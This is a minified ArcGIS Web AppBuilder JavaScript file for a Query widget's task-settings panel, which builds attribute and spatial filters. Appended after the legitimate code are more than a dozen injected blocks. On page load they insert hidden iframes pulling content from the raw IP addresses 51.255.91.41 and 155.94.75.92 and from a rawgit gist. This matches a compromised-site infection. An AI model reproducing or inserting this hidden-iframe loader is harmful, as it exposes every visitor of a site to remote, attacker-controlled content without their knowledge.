// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/TaskSetting.html":'\x3cdiv\x3e\r\n  \x3ctable class\x3d"top"\x3e\r\n    \x3ctr\x3e\r\n      \x3ctd class\x3d"first-td"\x3e\r\n        \x3cdiv class\x3d"back-arrow" data-dojo-attach-event\x3d"onclick:_onBtnParamsBackClicked"\x3e\x3c/div\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd class\x3d"second-td"\x3e\r\n        \x3cdiv class\x3d"task-name jimu-ellipsis" data-dojo-attach-point\x3d"taskNameDiv"\x3e\x3c/div\x3e\r\n      \x3c/td\x3e\r\n      \x3ctd class\x3d"third-td"\x3e\x3c/td\x3e\r\n    \x3c/tr\x3e\r\n  \x3c/table\x3e\r\n  \x3cdiv class\x3d"params-container" data-dojo-attach-point\x3d"paramsContainer"\x3e\r\n    \x3cdiv class\x3d"not-visible" data-dojo-attach-point\x3d"noFilterTip"\x3e${nls.noAttributeSpatialFilterTip}\x3c/div\x3e\r\n    \x3cdiv class\x3d"attributes-section" data-dojo-attach-point\x3d"attributesSectionDiv"\x3e\r\n      \x3cdiv class\x3d"first-stress attribute-filter-label"\x3e${nls.queryCriteira}\x3c/div\x3e\r\n      \x3cdiv class\x3d"sql-div jimu-widget-note" data-dojo-attach-point\x3d"sqlDiv"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"spatial-section" data-dojo-attach-point\x3d"spatialSectionDiv"\x3e\r\n      \x3cdiv class\x3d"spearator not-visible" data-dojo-attach-point\x3d"spatialSpearator"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"first-stress spatial-filter-label"\x3e${nls.spatialFilter}\x3c/div\x3e\r\n      \x3cdiv class\x3d"spatial-filter-tip" data-dojo-attach-point\x3d"spatialFilterTip"\x3e\x3c/div\x3e\r\n      \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"spatialTypeSelect" data-dojo-attach-event\x3d"change:_onSpatialTypeSelectChanged" class\x3d"restrict-select-width" style\x3d"width:100%;box-sizing:border-box;"\x3e\x3c/select\x3e\r\n      \x3cdiv class\x3d"spatial-filter-content" data-dojo-attach-point\x3d"spatialFilterContent"\x3e\r\n        \x3cdiv class\x3d"drawing-section" data-dojo-attach-point\x3d"drawingSection"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"features-section" data-dojo-attach-point\x3d"featuresSection"\x3e\r\n          \x3cdiv class\x3d"relationship-section"\x3e\r\n            \x3cdiv class\x3d"second-stress relationship-tip"\x3e${nls.spatialRelationship}\x3c/div\x3e\r\n            \x3cselect data-dojo-attach-point\x3d"relationshipSelect" data-dojo-type\x3d"dijit/form/Select" class\x3d"restrict-select-width relationship-select" style\x3d"width:100%;box-sizing:border-box;"\x3e\x3c/select\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-btn btn-execute" data-dojo-attach-point\x3d"btnExecute" data-dojo-attach-event\x3d"onclick:_onBtnApplyClicked"\x3e${nls.apply}\x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/Evented dojo/text!./TaskSetting.html dojo/on dojo/Deferred dojo/_base/lang dojo/_base/html dojo/_base/array dojo/promise/all jimu/filterUtils jimu/dijit/FilterParameters ./utils ./SingleQueryLoader ./SpatialFilterByDrawing jimu/dijit/SpatialFilterByFeatures esri/tasks/query".split(" "),function(m,n,p,q,r,t,h,k,f,g,u,v,w,x,l,y,z,A,B){return m([n,p,q,r],{baseClass:"query-task-setting",templateString:t,
askForValues:!1,_defaultRelationship:"SPATIAL_REL_INTERSECTS",nls:null,map:null,currentAttrs:null,layerInfosObj:null,postCreate:function(){this.inherited(arguments);this._initSelf()},run:function(){var a=this._getCleanClonedCurrentAttrs(this.currentAttrs);a.query.relationship=this._getRestRelationship();var c=this.getWhere(),e=this.getGeometry();v([c,e]).then(f.hitch(this,function(b){this.deactivate();a.query.where=b[0];a.query.geometry=b[1];a.query.geometry||console.log("Don't use geometry to query.");
if("function"===typeof this.onApply)this.onApply(a)}),f.hitch(this,function(a){console.error(a)}))},hideTempLayers:function(){this.spatialFilterByDrawing&&this.spatialFilterByDrawing.hideTempLayers();this.spatialFilterByFeatures&&this.spatialFilterByFeatures.hideTempLayers()},showTempLayers:function(){this.spatialFilterByDrawing&&this.spatialFilterByDrawing.showTempLayers();this.spatialFilterByFeatures&&this.spatialFilterByFeatures.showTempLayers()},_getCleanClonedCurrentAttrs:function(a){var c=y.getCleanCurrentAttrsTemplate(),
e=null,b;for(b in a)"queryTr"!==b&&"query"!==b&&(e=a[b],c[b]=f.clone(e));c.queryTr=a.queryTr;c.query.maxRecordCount=a.query.maxRecordCount;return c},onGetQueryResponse:function(){this.deactivate();this._tryResetSpatialFilterByDrawing();this._tryResetSpatialFilterByFeatures()},getWhere:function(){var a=new k,c=this._getWhereInfo();if(1===c.status){var e=this.currentAttrs.config.webMapLayerId;if(e){var b=null,b=l.isTable(this.currentAttrs.layerInfo)?this.layerInfosObj.getTableInfoById(e):this.layerInfosObj.getLayerInfoById(e),
e="";b&&(e=b.getFilter());b=c.where;e&&(b="("+e+") AND ("+c.where+")");a.resolve(b)}else a.resolve(c.where)}else a.reject("Can't get a valid sql");return a},_getWhereInfo:function(){var a={status:0,where:""};if(this.askForValues){var c=this.filterParams.getFilterExpr();c&&"string"===typeof c?(a.status=1,a.where=c):(a.status=-1,a.where=null)}else a.status=1,a.where=this.currentAttrs.config.filter.expr;1!==a.status||a.where||(a.where="1\x3d1");return a},_updateExecuteButtonStatus:function(){var a=this._isValidWhereToExecute()&&
this._isValidGeometryToExecute();a?g.removeClass(this.btnExecute,"disabled"):g.addClass(this.btnExecute,"disabled");return a},_isValidWhereToExecute:function(){return 0<this._getWhereInfo().status},_isValidGeometryToExecute:function(){var a=this.spatialTypeSelect.get("value");if("currentMapExtent"!==a){if("drawing"===a)return!!this.spatialFilterByDrawing.getGeometryInfo().geometry;if("useFeatures"===a)return this.spatialFilterByFeatures.isValidSearchDistance()}return!0},getGeometry:function(){var a=
new k,c=this.spatialTypeSelect.get("value");"currentMapExtent"===c?a.resolve(this.map.extent):"drawing"===c?(c=this.spatialFilterByDrawing.getGeometryInfo(),0>c.status?a.reject("Invalid search distance"):(0===c.status&&console.log("User doesn't draw anything"),a.resolve(c.geometry))):"useFeatures"===c?this.spatialFilterByFeatures.getGeometryInfo().then(f.hitch(this,function(c){-2===c.status?a.reject("Invalid search distance"):(-1===c.status?console.log("User doesn't select a layer"):0===c.status&&
console.log("User doesn't select any features"),a.resolve(c.geometry))}),f.hitch(this,function(c){a.reject(c)})):a.resolve(null);return a},deactivate:function(){this.spatialFilterByDrawing&&this.spatialFilterByDrawing.deactivate();this.spatialFilterByFeatures&&this.spatialFilterByFeatures.deactivate()},clearAllGraphics:function(){this.spatialFilterByDrawing&&this.spatialFilterByDrawing.clearAllGraphics();this.spatialFilterByFeatures&&this.spatialFilterByFeatures.clearAllGraphics()},canAutoRunning:function(){return this._canAttributeFilterAutoRunning()&&
this._canSpatialFilterAutoRunning()},_canAttributeFilterAutoRunning:function(){return 0<this._getWhereInfo().status&&!this.askForValues},_canSpatialFilterAutoRunning:function(){var a=this.spatialTypeSelect.getOptions()||[];return 0===a.length?!0:1===a.length?(a=this.spatialTypeSelect.get("value"),"drawing"!==a&&"useFeatures"!==a):!1},_initSelf:function(){var a=this.currentAttrs.config,c=this.currentAttrs.layerInfo;this.taskNameDiv.innerHTML=a.name||"";this.taskNameDiv.title=this.taskNameDiv.innerHTML;
this.filterParams=new x;this.filterParams.placeAt(this.sqlDiv,"before");this.own(h(this.filterParams,"change",f.hitch(this,this._updateExecuteButtonStatus)));var e=f.clone(a.filter);this.filterParams.build(a.url,c,e,a.webMapLayerId);this.askForValues=(new w).isAskForValues(this.currentAttrs.config.filter);e=!0;if(this.askForValues){e=!0;this.currentAttrs.config.filter.expr&&(this.sqlDiv.innerHTML=this.currentAttrs.config.filter.expr);var b=this.filterParams.getFilterExpr();b&&(this.sqlDiv.innerHTML=
b);this.own(h(this.filterParams,"change",f.hitch(this,function(a){this.sqlDiv.innerHTML="";a&&(this.sqlDiv.innerHTML=a)})))}else e=this.currentAttrs.config.showSQL?"1\x3d1"!==this.currentAttrs.config.filter.expr:!1,this.sqlDiv.innerHTML=this.currentAttrs.config.filter.expr;this.currentAttrs.config.showSQL?g.removeClass(this.sqlDiv,"not-visible"):g.addClass(this.sqlDiv,"not-visible");e?g.removeClass(this.attributesSectionDiv,"not-visible"):g.addClass(this.attributesSectionDiv,"not-visible");var b=
this.currentAttrs.config.spatialFilter,d=null;b||(b={});l.isTable(c)&&(b={});b.currentMapExtent&&(d={value:"currentMapExtent",label:this.nls.useCurrentExtentTip},this.spatialTypeSelect.addOption(d),b.currentMapExtent["default"]&&this.spatialTypeSelect.set("value",d.value));b.drawing&&(d={value:"drawing",label:this.nls.useDrawGraphicTip},this.spatialTypeSelect.addOption(d),b.drawing["default"]&&this.spatialTypeSelect.set("value",d.value),d=b.drawing.buffer,this.spatialFilterByDrawing=new z({drawBoxOption:{map:this.map,
geoTypes:b.drawing.geometryTypes},nls:this.nls,enableBuffer:!!d,distance:f.getObject("defaultDistance",!1,d)||0,unit:f.getObject("defaultUnit",!1,d)||""}),this.own(h(this.spatialFilterByDrawing,"change",f.hitch(this,this._updateExecuteButtonStatus))),this.spatialFilterByDrawing.placeAt(this.drawingSection));if(b.useFeatures){d={value:"useFeatures",label:this.nls.useFeaturesTip};this.spatialTypeSelect.addOption(d);b.useFeatures["default"]&&this.spatialTypeSelect.set("value",d.value);var d=b.useFeatures.buffer,
k=[];a.webMapLayerId&&k.push(a.webMapLayerId);this.spatialFilterByFeatures=new A({map:this.map,nls:this.nls,enableBuffer:!!d,distance:f.getObject("defaultDistance",!1,d)||0,unit:f.getObject("defaultUnit",!1,d)||"",showLoading:!1,ignoredFeaturelayerIds:k});this.spatialFilterByFeatures.tipNode&&g.setStyle(this.spatialFilterByFeatures.tipNode,"display","block");this.spatialFilterByFeatures.placeAt(this.featuresSection);this.own(h(this.spatialFilterByFeatures,"loading",f.hitch(this,function(){this.domNode&&
this.shelter.show()})));this.own(h(this.spatialFilterByFeatures,"unloading",f.hitch(this,function(){this.domNode&&this.shelter.hide()})));this.own(h(this.spatialFilterByFeatures,"search-distance-change",f.hitch(this,this._updateExecuteButtonStatus)));(a=b.useFeatures.relationships)&&0<a.length?u.forEach(a,f.hitch(this,function(a){this.relationshipSelect.addOption({value:a.relationship,label:a.label})})):this.relationshipSelect.addOption({value:this._defaultRelationship,label:this._defaultRelationship})}b.fullLayerExtent&&
(d={value:"fullLayerExtent",label:this.nls.noSpatialLimitTip},this.spatialTypeSelect.addOption(d),b.fullLayerExtent["default"]&&this.spatialTypeSelect.set("value",d.value));a=!0;b=this.spatialTypeSelect.getOptions()||[];0===b.length?(a=!1,this.spatialFilterTip.innerHTML=this.nls.noSpatialLimitTip):1===b.length?(a="fullLayerExtent"!==b[0].value,this.spatialFilterTip.innerHTML=b[0].label,g.addClass(this.spatialTypeSelect.domNode,"not-visible")):a=!0;l.isTable(c)&&(a=!1);a?g.removeClass(this.spatialSectionDiv,
"not-visible"):g.addClass(this.spatialSectionDiv,"not-visible");this._onSpatialTypeSelectChanged();e||a||g.removeClass(this.noFilterTip,"not-visible")},_getConstantRelationship:function(){var a=this._defaultRelationship;"useFeatures"===this.spatialTypeSelect.get("value")&&(a=this.relationshipSelect.get("value"));return a},_getRestRelationship:function(){var a=this._getConstantRelationship();return B[a]},_onSpatialTypeSelectChanged:function(){var a=this.spatialTypeSelect.get("value");"drawing"===a?
g.setStyle(this.drawingSection,"display","block"):(g.setStyle(this.drawingSection,"display","none"),this._tryResetSpatialFilterByDrawing());"useFeatures"===a?g.setStyle(this.featuresSection,"display","block"):(g.setStyle(this.featuresSection,"display","none"),this._tryResetSpatialFilterByFeatures());this.spatialTypeSelect.domNode.title="";a&&(a=this.spatialTypeSelect.getOptions(a))&&(this.spatialTypeSelect.domNode.title=a.label);this._updateExecuteButtonStatus()},_tryResetSpatialFilterByDrawing:function(){this.spatialFilterByDrawing&&
this.spatialFilterByDrawing.reset()},_tryResetSpatialFilterByFeatures:function(){this.spatialFilterByFeatures&&this.spatialFilterByFeatures.reset()},_onBtnParamsBackClicked:function(){this._tryResetSpatialFilterByDrawing();this._tryResetSpatialFilterByFeatures();if("function"===typeof this.onBack)this.onBack()},_onBtnApplyClicked:function(){this._updateExecuteButtonStatus()&&this.run()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});